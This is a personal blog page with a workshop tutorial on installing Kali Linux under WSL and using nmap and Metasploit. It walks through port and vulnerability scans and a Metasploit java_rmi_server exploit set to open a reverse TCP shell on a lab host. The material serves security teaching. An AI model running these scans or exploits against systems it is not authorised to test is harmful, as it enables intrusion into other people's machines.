<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Posts :: Workshops</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://busterwarn.github.io/posts/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://busterwarn.github.io/styles.css">







  <link rel="shortcut icon" href="https://busterwarn.github.io/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="https://busterwarn.github.io/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Posts">
<meta property="og:description" content="" />
<meta property="og:url" content="https://busterwarn.github.io/posts/" />
<meta property="og:site_name" content="Workshops" />

  
    <meta property="og:image" content="img/favicon/%!s().png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">





  <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Workshops" />









</head>
<body class="">


<div class="container headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://busterwarn.github.io/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
  
  <div class="posts">
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://busterwarn.github.io/posts/about/">About</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2023-06-12 ::
            </time>
          
          
            <span class="post-author">Buster Hultgren Wärn</span>
          
        </div>

        

        


        <div class="post-content">
          
            <p>Nothing here =)</p>

          
        </div>

        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://busterwarn.github.io/posts/hacking_workshop/setup_pentest_tools/">Setting up Penetration Testing Tools</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2023-06-12 ::
            </time>
          
          
            <span class="post-author">Buster Hultgren Wärn</span>
          
        </div>

        

        


        <div class="post-content">
          
            <h1 id="introduction">Introduction</h1>
<p>In penetration testing, a wide range of tools are used. For our purposes, we&rsquo;ll be focusing these two: <a href="https://nmap.org/">nmap</a> and <a href="https://www.metasploit.com/">Metasploit</a>.</p>
<p>This guide will demonstrate how to install these tools, particularly through the Kali Linux distribution. Kali Linux can be easily set up on Windows 10 or 11 using the <a href="https://learn.microsoft.com/en-us/windows/wsl/about">Windows Subsystem for Linux (WSL)</a>.</p>
<h2 id="kali-linux">Kali Linux</h2>
<p>Kali Linux is a Linux distribution specifically designed for penetration testing. It comes pre-installed with many standard tools required for this purpose.</p>
<h2 id="nmap">Nmap</h2>
<p>Nmap is an enumeration tool used to scan IP addresses and ports. Its primary objective is to identify the attack surface of a target.</p>
<h2 id="metasploit">Metasploit</h2>
<p>Metasploit, specifically msfconsole, is a command-line tool that provides a wide range of vulnerabilities. It includes auxiliary scanners as well as working vulnerabilities that can be exploited on various servers.</p>
<h1 id="installation-guide">Installation Guide</h1>
<h2 id="installing-kali-linux-on-wsl-for-windows-1011">Installing Kali Linux on WSL for Windows 10/11</h2>
<p>There are several methods to access these tools on your computer. We recommend installing WSL with Kali Linux either with a <a href="#getting-a-kali-linux-gui">GUI</a> or the <a href="#install-wsl-with-kali-linux">regular way</a> and accessing Kali from a terminal interface. Both methods are described below.</p>
<h3 id="common-issues">Common Issues</h3>
<p>Ensure that you run PowerShell as an administrator before starting the installation.</p>

  <img src="images/run_powershell_as_admin.png"  class="left"  style="border-radius: 8px;"  />


<p>You might encounter an issue where hardware virtualization needs to be enabled. Refer to the following resources for more information:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/">About Hyper-V on Windows</a></li>
<li><a href="https://support.microsoft.com/en-us/windows/enable-virtualization-on-windows-11-pcs-c5578302-6e43-4b4b-a449-8ced115f58e1">Enabling Virtualization on Windows 11</a></li>
</ul>
<h2 id="installing-kali-linux">Installing Kali Linux</h2>
<p>If you already have Debian, Ubuntu, or another Linux distribution set up, that should be sufficient. However, Kali Linux is the recommended distribution for penetration testing, so we&rsquo;ll be installing that.</p>
<h3 id="installing-wsl-with-kali-linux">Installing WSL with Kali Linux</h3>
<p>Follow the instructions provided on kali.org: <a href="https://www.kali.org/docs/wsl/wsl-preparations/">WSL Preparations</a></p>
<h3 id="getting-a-kali-linux-gui">Getting a Kali Linux GUI</h3>
<p>The following video demonstrates similar steps that should be easy to follow:</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/UXyS-xofGNM" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h3 id="installing-useful-dependencies">Installing Useful Dependencies</h3>
<p>While Kali Linux comes with many tools pre-installed, WSL has minimal packages installed by default. It&rsquo;s recommended to install some basic tools before getting started:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt-get update -y
</span></span><span style="display:flex;"><span>sudo apt-get upgrade -y
</span></span><span style="display:flex;"><span>sudo apt-get install vim -y     <span style="color:#75715e"># Not necessary</span>
</span></span><span style="display:flex;"><span>sudo apt-get install git -y     <span style="color:#75715e"># Not necessary</span>
</span></span><span style="display:flex;"><span>sudo apt-get install ruby-full  <span style="color:#75715e"># Required for Metasploit</span>
</span></span></code></pre></div><h2 id="install-nmap">Install nmap</h2>
<p>To install nmap on your Kali Linux (either virtual or real), run the following command in the terminal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt-get install nmap -y
</span></span></code></pre></div><p>You can test if nmap is working by running <code>nmap google.com</code> and checking the output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ nmap google.com
</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-06-09 13:04 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> google.com <span style="color:#f92672">(</span>142.250.74.78<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.015s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Other addresses <span style="color:#66d9ef">for</span> google.com <span style="color:#f92672">(</span>not scanned<span style="color:#f92672">)</span>: 2a00:1450:400f:802::200e
</span></span><span style="display:flex;"><span>rDNS record <span style="color:#66d9ef">for</span> 142.250.74.78: arn09s23-in-f14.1e100.net
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
</span></span><span style="display:flex;"><span>80/tcp  open  http
</span></span><span style="display:flex;"><span>443/tcp open  https
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.08 seconds
</span></span></code></pre></div><h2 id="install-metasploit-framework">Install Metasploit-Framework</h2>
<p>Run the following command to install Metasploit-Framework:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt-get install metasploit-framework postgresql -y
</span></span></code></pre></div><p>After the installation is complete, you can open Metasploit-Framework. It will display some ASCII art at startup, and you should see the prompt <code>msf6&gt;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ msfconsole
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>               .;lxO0KXXXK0Oxl:.
</span></span><span style="display:flex;"><span>           ,o0WMMMMMMMMMMMMMMMMMMKd,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> oMMMMMMMMMMx.                    dMMMMMMMMMMx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.WMMMMMMMMM:                       :MMMMMMMMMM,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xMMMMMMMMMo                         lMMMMMMMMMO
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xMMMMMMMMMd                        ,0MMMMMMMMMMK;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.WMMMMMMMMMc                         &#39;</span>OMMMMMM0,
</span></span><span style="display:flex;"><span> lMMMMMMMMMMk.                         .kMMO<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  dMMMMMMMMMMWd&#39;</span>                         ..
</span></span><span style="display:flex;"><span>   cWMMMMMMMMMMMNxc<span style="color:#e6db74">&#39;.                ##########
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      ;0MMMMMMMMMMMMMMMo.          +:+
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        .dNMMMMMMMMMMMMo          +#++:++#+
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           &#39;</span>oOWMMMMMMMMo                +:+
</span></span><span style="display:flex;"><span>               .,cdkO0K;        :+:    :+:
</span></span><span style="display:flex;"><span>                                :::::::+:
</span></span><span style="display:flex;"><span>                      Metasploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">=[</span> metasploit v6.3.19-dev                          <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2318</span> exploits - <span style="color:#ae81ff">1215</span> auxiliary - <span style="color:#ae81ff">412</span> post       <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">1234</span> payloads - <span style="color:#ae81ff">46</span> encoders - <span style="color:#ae81ff">11</span> nops           <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">9</span> evasion                                       <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Metasploit tip: Use sessions -1 to interact with the
</span></span><span style="display:flex;"><span>last opened session
</span></span><span style="display:flex;"><span>Metasploit Documentation: https://docs.metasploit.com/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 &gt;
</span></span></code></pre></div><h1 id="user-guide">User Guide</h1>
<h2 id="using-nmap">Using Nmap</h2>
<p>Nmap is a powerful tool with extensive functionality. In this guide, we will cover the basics.</p>
<p>By default, running nmap on any IP address will scan the 1,000 most common ports for each protocol.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap 217.114.85.70
</span></span></code></pre></div><p>You can specify which ports to scan. For example, to scan all possible ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p1-65535 217.114.85.70
</span></span></code></pre></div><p>Scanning all ports can take some time. To speed it up, you can use the <code>-n</code> flag to disable DNS resolution:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p1-65535 -n 217.114.85.70
</span></span></code></pre></div><p>Another useful flag is <code>-A</code> to &ldquo;Enable OS detection, version detection, script scanning, and traceroute&rdquo; providing valuable information:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -A 217.114.85.70
</span></span></code></pre></div><p><code>-sV</code> is another useful flag: &ldquo;Probe open ports to determine service/version info&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -sV 217.114.85.70
</span></span></code></pre></div><p>Different flags can be combined to enhance scanning capabilities:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -sV -A -p1-65535 217.114.85.70
</span></span></code></pre></div><p>Nmap also offers various scripts that you can use. For example, if you have found a Windows server with an SMB port 445, you can use the <code>smb-os-discovery</code> script to find out the exact version of Windows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap --script<span style="color:#f92672">=</span>smb-os-discovery -p <span style="color:#ae81ff">445</span> 217.114.85.70
</span></span></code></pre></div><p>One popular vulnerability scanning script is available at: <a href="https://github.com/vulnersCom/nmap-vulners">https://github.com/vulnersCom/nmap-vulners</a>. Here is an example of a previous scan on an HTTPS server with several vulnerabilities:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap --script vulners -sV 192.168.56.108
</span></span></code></pre></div>
  <img src="images/vulners_scan.png"  class="left"  style="border-radius: 8px;"  />


<p>All scripts are located under <code>/usr/share/nmap/scripts/</code>. You can create your own scripts or download scripts and place them in that directory.</p>
<h2 id="using-metasploit">Using metasploit</h2>
<p>To start the Metasploit console, enter the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfconsole
</span></span></code></pre></div><p>Once the console is open, you will have access to various tools. You can search for specific tools based on your requirements. For example, if you&rsquo;re attacking an Apache server, you can search for available tools:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>search apache
</span></span></code></pre></div><p>The search will provide multiple results. You can narrow down the search to find the desired tool. The tools in Metasploit come in two main categories: scanners and exploits. Scanners are similar to nmap but usually more specialized, while exploits can perform actions like memory dumping and gaining a reverse shell.</p>
<p>Let&rsquo;s take an example of using the <code>java_rmi_server</code> module. First, enter <code>use &lt;module&gt;</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 &gt; use multi/misc/java_rmi_server
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to java/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/java_rmi_server<span style="color:#f92672">)</span> &gt;
</span></span></code></pre></div><p>To view the options for the module, use the <code>info</code> command. It will provide detailed information, including a description. You can also use <code>show options</code> which gives you the essential information needed to run the module. From there, you can identify any missing settings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/java_rmi_server<span style="color:#f92672">)</span> &gt; show options
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/misc/java_rmi_server<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name       Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   HTTPDELAY  <span style="color:#ae81ff">10</span>               yes       Time that the HTTP Server will wait <span style="color:#66d9ef">for</span> the payload request
</span></span><span style="display:flex;"><span>   RHOSTS                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span>                                         it.html
</span></span><span style="display:flex;"><span>   RPORT      <span style="color:#ae81ff">1099</span>             yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
</span></span><span style="display:flex;"><span>                                         or 0.0.0.0 to listen on all addresses.
</span></span><span style="display:flex;"><span>   SRVPORT    <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL <span style="color:#66d9ef">for</span> incoming connections
</span></span><span style="display:flex;"><span>   SSLCert                     no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   URIPATH                     no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>java/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   LHOST  172.19.119.45    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Exploit target:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Id  Name
</span></span><span style="display:flex;"><span>   --  ----
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Generic <span style="color:#f92672">(</span>Java Payload<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
</span></span></code></pre></div><p>Typically, the <code>RHOSTS</code> and <code>RPORT</code> settings are required. If <code>RPORT</code> is already set, you can proceed to set the <code>RHOSTS</code>. Here&rsquo;s a helpful tip: Use setg to set the values globally. This way, the settings will be saved when switching between modules:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/java_rmi_server<span style="color:#f92672">)</span> &gt; setg RHOSTS 192.168.56.101
</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.56.101
</span></span></code></pre></div><p>You can select different payloads depending on the context. In general, you don&rsquo;t change the exploit itself, but rather the code it uses to establish a reverse shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/java_rmi_server<span style="color:#f92672">)</span> &gt; show payloads
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Compatible Payloads
</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                     Disclosure Date  Rank    Check  Description</span>
</span></span><span style="display:flex;"><span>   -   ----                                     ---------------  ----    -----  -----------
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   payload/generic/custom                                    normal  No     Custom Payload
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   payload/generic/shell_bind_aws_ssm                        normal  No     Command Shell, Bind SSM <span style="color:#f92672">(</span>via AWS API<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">10</span>  payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">11</span>  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">12</span>  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">13</span>  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">14</span>  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager <span style="color:#f92672">(</span>Multiple Architectures<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">15</span>  payload/multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager <span style="color:#f92672">(</span>Multiple Architectures<span style="color:#f92672">)</span>
</span></span></code></pre></div><p><code>payload/generic/shell_reverse_tcp</code> looks fun! Lets use it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/misc/java_rmi_server<span style="color:#f92672">)</span> &gt; set payload <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; generic/shell_reverse_tcp
</span></span></code></pre></div><p>Finally, you can run the exploit using the <code>exploit</code> command (or <code>run</code>):</p>

  <img src="images/java_rmi_server.png"  class="left"  style="border-radius: 8px;"  />



          
        </div>

        
      </article>
    

    <div class="pagination">
  <div class="pagination__buttons">
    
    
  </div>
</div>

  </div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
